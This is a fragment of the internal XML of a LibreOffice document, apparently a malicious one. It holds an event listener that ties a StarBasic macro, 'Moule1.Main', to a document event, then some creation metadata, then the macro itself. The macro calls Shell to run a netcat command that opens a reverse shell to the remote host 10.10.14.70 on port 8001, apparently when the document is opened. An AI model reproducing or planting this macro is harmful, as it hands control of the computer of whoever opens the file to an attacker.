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Moule1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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L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01:56:28.192736138</meta:creation-date>
    <dc:date>2023-07-30T14:49:23.531229604</dc:date>
    <meta:editing-duration>PT20M49S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.5.1$Linux_X86_64 LibreOffice_project/40$Build-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ule1.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Moule1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("nc 10.10.14.70 8001 -e /bin/bash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